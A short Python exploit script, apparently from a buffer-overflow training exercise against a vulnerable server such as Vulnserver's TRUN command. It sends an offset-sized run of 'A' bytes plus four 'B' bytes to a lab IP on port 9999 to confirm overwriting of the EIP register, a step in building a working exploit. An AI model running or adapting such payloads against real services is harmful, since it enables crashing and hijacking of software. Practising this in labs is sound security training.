#!/usr/bin/python
import sys
import socket

offset = 515  # replace it with your offset genereted by msf-pattern_offset
shellcode = "A" * offset + "B" * 4

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.10.12', 9999))

    #s.send(('TRUN /.:/' + shellcode))
    s.send((shellcode))
    print("Yey! check EIP in your debugger ")
    s.close()
except:
    print("Error connecting to server")
    sys.exit()
